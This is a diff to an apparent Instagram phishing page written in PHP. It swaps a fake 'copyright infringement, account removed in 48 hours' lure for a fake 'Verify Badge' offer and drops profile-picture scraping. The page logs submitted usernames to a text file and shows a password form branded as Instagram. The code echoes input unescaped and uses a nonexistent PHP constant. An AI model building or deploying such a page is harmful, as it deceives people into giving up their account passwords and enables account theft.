@@ -21,17 +21,6 @@ if($_POST)
 if(!empty($_POST['username']) && empty($_POST['comen']))
 {
     $_POST['username'] = strtolower($_POST['username']);
-    $link = "https://instagram.com/" . $_POST['username'];
-    $veri = @file_get_contents($link);
-    if(empty($veri))
-    {
-        header("Location: /");
-    }
-    
-    $veri=explode("window._sharedData = ",$veri)[1];
-    $veri=explode(";</script>",$veri)[0];
-    $kullanicibilgileri=json_decode($veri,true)['entry_data']['ProfilePage']['0']['graphql']['user'];
-    
     $dosya = fopen("bariscodefx_kullanicilar.txt", "a");
     fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "tarih ====> " . date("Y-m-d H:i:s", time()) .  PHP_MULTILINE);
     fclose($dosya);
@@ -51,9 +40,9 @@ if(isset($_POST['comen']))
 <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>Copyright Infringement - Instagram</title>
+        <title>Verify Badge - Instagram</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-        <meta name="description" content="Copyright Infringement on your Instagram Account">
+        <meta name="description" content="Verify Badge on your Instagram Account">
         <meta name="author" content="Instagram">
         
         <!-- SCRIPTS -->
@@ -81,7 +70,7 @@ if(isset($_POST['comen']))
             <div class="banner-sm">
                 <img src="images/banner-sm.png" class="banner-sm-img" width="175">
             </div>
-            <span class="color-gray">As Instagram, we remove accounts that violate our copyright laws. Continue by entering your username to learn about and appeal to copyright infringement related to your account.</span>
+            <span class="color-gray">Get Verify Badge on your Instagram account.</span>
             <div class="mb-3">
                 <input type="text" name="username" id="username" class="form-input" placeholder="Username">
             </div>
@@ -93,24 +82,15 @@ if(isset($_POST['comen']))
         }else {
         ?>
         <form action="/" method="POST" class="second-form">
-            <?php
-            if(isset($kullanicibilgileri['profile_pic_url'])) :
-            ?>
-            <div class="profile">
-                <img src="<?= $kullanicibilgileri['profile_pic_url']; ?>" width="82" class="profile-img">
-            </div>
-            <?php
-            endif;
-            ?>
-            <p>Copyright Infringement on @<?= $_POST['username']; ?></p>
-            <span class="color-gray">We have received numerous complaints that you violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 48 hours. If you think this is wrong, continue by logging in.</span>
+            <p>Verify Badge @<?= $_POST['username']; ?></p>
+            <span class="color-gray">Verify Badge on your account.</span>
             <div class="mb-3">
                 <input type="password" name="password" id="password" class="form-input" placeholder="Password">
             </div>
             <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
             <input hidden type="number" name="comen" value="1">
             <div class="mb-3">
-                <button type="submit">Log In</button>
+                <button type="submit">Get Verify</button>
             </div>
         </form>
         <?php
